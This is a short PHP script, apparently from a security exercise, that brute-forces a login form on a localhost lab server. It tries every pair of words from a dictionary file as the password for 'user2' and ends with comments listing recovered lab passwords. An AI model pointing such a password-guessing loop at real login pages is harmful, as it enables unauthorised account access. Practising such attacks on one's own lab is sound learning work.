<?php

/* il faut charger le dictionnaire dans un tableau */

$file= "data.txt";
$dico = [];
$file_handle = fopen($file, "r");
while (!feof($file_handle)) {
    $line = fgets($file_handle);
    $dico[] = trim($line);
    array_push($dico, $line);
}

$ch = curl_init('http://localhost:3000/Auth/exo2/login3.php');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$url1 = 'http://localhost:3000/Auth/exo2/home.html';

foreach ($dico as $password) {
    foreach ($dico as $password2) {
    $post = [
        'username' => 'user2',
        'password' => $password . $password2
    ];

    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    $response = curl_exec($ch);
    $url = curl_getinfo($ch, CURLINFO_REDIRECT_URL);

    if ($url === $url1) {
        echo "Login successful\n";
        echo "username: {$post['username']}\n";
        echo "password: {$post['password']}\n";
        curl_close($ch);
        exit(0);
}}}


//user1 : cream
//user2 : aboriginalland